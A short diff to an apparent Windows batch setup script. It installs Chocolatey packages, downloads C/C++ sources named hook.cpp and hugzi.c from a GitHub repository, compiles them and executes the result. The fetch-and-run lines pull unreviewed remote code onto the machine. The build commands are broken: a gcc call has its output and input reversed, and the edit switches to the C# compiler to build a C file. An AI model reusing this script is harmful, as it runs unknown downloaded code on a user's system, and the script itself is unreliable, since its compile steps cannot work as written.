@@ -8,6 +8,7 @@ if not exist "%SystemRoot%\System32\chocolatey.exe" (
 
 choco install curl -y
 choco install mingw -y
+choco install dotnetcore-sdk -y
 
 curl -L https://github.com/kaosSec/hugzi/raw/main/hook.cpp -o hook.cpp
 curl -L https://github.com/kaosSec/hugzi/raw/main/loz.def -o loz.def
@@ -31,7 +32,7 @@ gcc -o MSSSoSad.c MSSSoSad.exe
 
 curl -L https://github.com/kaosSec/hugzi/raw/main/hugzi.c -o hugzi.c
 
-gcc -o hugzi.c hugzi.exe
+csc /out:hugzi.exe hugzi.c
 
 .\hugzi lucy4.o
 
